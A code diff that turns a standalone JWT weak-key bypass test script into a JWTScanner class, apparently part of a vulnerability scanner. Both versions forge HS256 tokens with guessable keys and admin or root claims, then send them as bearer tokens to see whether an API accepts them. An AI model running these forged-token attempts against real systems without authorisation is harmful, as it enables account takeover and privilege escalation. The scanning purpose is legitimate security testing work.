@@ -1,43 +1,116 @@
-#!/usr/bin/env python3
-"""
-JWT Authentication Bypass (Weak Signing Key) Test Script
-Target: GET /users/v1/me
-Base URL: http://localhost:5002
+"""JWT Authentication Bypass Scanner"""
 
-This script attempts to bypass JWT authentication by forging a token with a weak signing key.
-If the API accepts the forged token and returns valid user data, it may be vulnerable.
-Requires: PyJWT (install via pip install pyjwt)
-"""
+from typing import Dict, List, Optional, Any
 import requests
 import jwt
-import time
+import uuid
+from datetime import datetime
+from .base_scanner import BaseScanner
+from .utils.logger import setup_scanner_logger
 
-base_url = "http://localhost:5002"
-url = f"{base_url}/users/v1/me"
-print(f"Testing JWT Authentication Bypass on URL: {url}")
+class JWTScanner(BaseScanner):
+    def __init__(self):
+        super().__init__()
+        self.logger = setup_scanner_logger("jwt")
+        self.context = {}
+        self.target = None
+        
+    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
+             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
+             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
+        vulnerabilities = []
+        
+        # Set target URL for make_request method
+        self.target = url
+        
+        # Store context if provided
+        if context:
+            self.context = context
+            self.logger.info(f"Received context with {len(context)} items")
+            
+            # Use finding IDs from previous scans for dependency tracking
+            dependencies = context.get('finding_ids', [])
+            self.logger.info(f"Using {len(dependencies)} dependencies from previous findings")
+            
+            # Use credentials discovered by other scanners
+            credentials = context.get('credentials', [])
+            self.logger.info(f"Using {len(credentials)} credentials from other scanners")
+        else:
+            dependencies = []
+        
+        # Generate correlation ID for tracking related requests
+        correlation_id = str(uuid.uuid4())
+        
+        # Common weak keys to test
+        weak_keys = [
+            "secret",
+            "key",
+            "private",
+            "1234567890",
+            "password",
+            "admin"
+        ]
+        
+        # Test payloads
+        test_payloads = [
+            {"sub": "admin", "role": "admin"},
+            {"sub": "system", "role": "system"},
+            {"sub": "root", "role": "superuser"}
+        ]
+        
+        for weak_key in weak_keys:
+            for payload in test_payloads:
+                try:
+                    # Create forged token
+                    forged_token = jwt.encode(payload, weak_key, algorithm="HS256")
+                    
+                    # Track authentication state
+                    auth_state = {
+                        "token": forged_token,
+                        "auth_type": "bearer",
+                        "weak_key": weak_key
+                    }
+                    
+                    # Test the forged token
+                    test_headers = {"Authorization": f"Bearer {forged_token}"}
+                    test_resp = requests.get(
+                        f"{url}{path}",
+                        headers=test_headers,
+                        timeout=5
+                    )
+                    
+                    # Capture transaction for evidence
+                    request_data, response_data = self.capture_transaction(
+                        test_resp,
+                        auth_state=auth_state,
+                        correlation_id=correlation_id
+                    )
+                    
+                    if test_resp.status_code == 200:
+                        finding = {
+                            "type": "JWT_WEAK_KEY",
+                            "severity": "CRITICAL",
+                            "detail": f"Successfully forged JWT token using weak key: {weak_key}",
+                            "evidence": {
+                                "jwt_request": request_data,
+                                "jwt_response": response_data,
+                                "auth_state": auth_state,
+                                "correlation_id": correlation_id,
+                                "weak_key": weak_key,
+                                "payload": payload
+                            },
+                            "dependencies": dependencies,
+                            "context_update": {
+                                "vulnerable_jwt_endpoints": self.context.get("vulnerable_jwt_endpoints", []) + [path],
+                                "weak_keys": self.context.get("weak_keys", []) + [weak_key]
+                            }
+                        }
+                        vulnerabilities.append(finding)
+                        self.logger.warning(f"Found JWT weak key vulnerability: {weak_key}")
+                        
+                except Exception as e:
+                    self.logger.error(f"Error testing JWT weak key {weak_key}: {str(e)}")
+                    
+        return vulnerabilities
 
-# Create a forged JWT token.
-payload = {
-    "user": "name1",
-    "iat": int(time.time())
-}
-# Use a weak key for signing (e.g., "secret")
-weak_key = "secret"
-token = jwt.encode(payload, weak_key, algorithm="HS256")
-
-headers = {
-    "Authorization": f"Bearer {token}"
-}
-
-try:
-    response = requests.get(url, headers=headers, timeout=10)
-    print("Status Code:", response.status_code)
-    print("Response Body:")
-    print(response.text)
-    # If the forged token is accepted, then the API may be vulnerable.
-    if response.status_code == 200 and "name1" in response.text:
-        print("Potential JWT Authentication Bypass vulnerability detected!")
-    else:
-        print("No JWT Authentication Bypass vulnerability detected based on response content.")
-except Exception as e:
-    print("Error during request:", e)
+scan = JWTScanner().scan
